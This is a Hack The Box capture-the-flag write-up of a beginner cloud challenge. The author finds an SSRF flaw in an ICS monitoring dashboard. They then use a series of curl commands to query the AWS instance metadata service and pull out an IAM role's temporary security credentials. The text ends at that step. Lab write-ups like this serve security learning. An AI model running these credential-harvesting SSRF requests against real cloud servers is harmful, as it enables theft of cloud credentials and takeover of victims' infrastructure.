**Description:**  
After a relentless week-long effort, a lone Task Force operative successfully breached Volnaya's cloud-based ICS monitoring network, securing us permanent access to their front-end monitoring dashboard and opening a critical window into their industrial infrastructure. Your goal is to infiltrate deeper, locate sensitive data, and enable the Task Force to assume control of their core systems. IP: 3.15.107.79  
**HTB Difficulty Rating:** Very easy  
**How it felt:** WOOOH LIMITLESS PAIN!

# Steps taken
## Initial Recon and discovery:
Unfortunately, Shodan.io didn't have any information on this 3.15.107.79, but IP identified it as an Amazon AWS server. Launched community Burp Suite and browsed to 3.15.107.79 where a dashboard was presented. The Dashboard contained multiple blocks of information and an input button (Check Status).
![Visual ICS Monitoring Dashboard](Dashboard.png)  

When inspecting the response in HTTP History of Burp Suite, the button sends a POST request to https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status, leading to https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/, revealing https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private which unfortunately required an authentication token.
![Form](Form.png)   
![Private Endpoint API](Endpoints.png)

Tinkered with https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private in curl for a bit and eventually got stuck requiring a security token. Resulted in pivoting back to the Dashboard, and was curious to see what would happen if the URL was switched in the form to https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private. The result appeared to do something, combined with the alert (potential hint) previously on the dashboard about a successful SSRF attack led to 2 hours of research on SSRF.
![Modified_Form](Modified_Form.png)   
![Result](Result_Of_MF.png)

## Exploitation
**These next steps could be done using the form, but I found myself using curl instead.**   
**Fun Note:** AWS uses 169.254.169.254 as the metadata-IP where the metadata service can be accessed via http://169.254.169.254/latest/meta-data/ from the E2 instance.
1) Used ```curl -X POST http://3.15.107.79/ -d "url=https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status"``` to test curl and see what would happen to the output. The output appeared to be a huge chunk instead of nicely spread out. This led me to further investigate SSRF on http://3.15.107.79/
   
2) Next tried ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/"``` revealing the **iam/** metadata key. The goal was to extract the temporary security credentials from ```iam/security-credentials/role-name```.   
![I am](iam_exposed.png)   
3) Used ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"``` to get the role-name which was "APICallerRole"   
![Role Name](Role_Name.png)
4) To get the temp security credentials used ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/APICallerRole"```   
![Temp Sec Credentials](Temp_Sec_Credentials.png)
   
